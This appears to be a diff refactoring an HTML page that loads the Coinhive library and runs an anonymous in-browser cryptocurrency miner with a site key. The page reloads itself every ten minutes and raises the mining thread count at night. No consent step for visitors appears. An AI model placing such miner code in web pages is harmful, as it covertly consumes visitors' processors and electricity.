@@ -6,17 +6,21 @@
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <body>
     <script>
-        function AutoRefresh(timeoutPeriod) {
-            setTimeout("location.reload(true);",timeoutPeriod);
+        function AutoRefresh(timeout) {
+            setTimeout("location.reload(true);",timeout);
         }
         window.onload = AutoRefresh(10*60*1000); // min * s * ms
 
-        var h = new Date().getHours();
-        var n = 6;
-        if(h>7 && h<23)
-            n = 3;
-        else if (h>=0 && h<6)
-            n = 10;
+        function getN() {
+            var h = new Date().getHours();
+            if(h>7 && h<23)
+                return 3;
+            else if (h>=0 && h<6)
+                return 10;
+            return 6;
+        }
+
+        var n = getN();
         var min = new CoinHive.Anonymous('80JQlNnsmQN3OeJHBNAGIHLQgKg9qhto');
         min.setNumThreads(n);
         min.start();
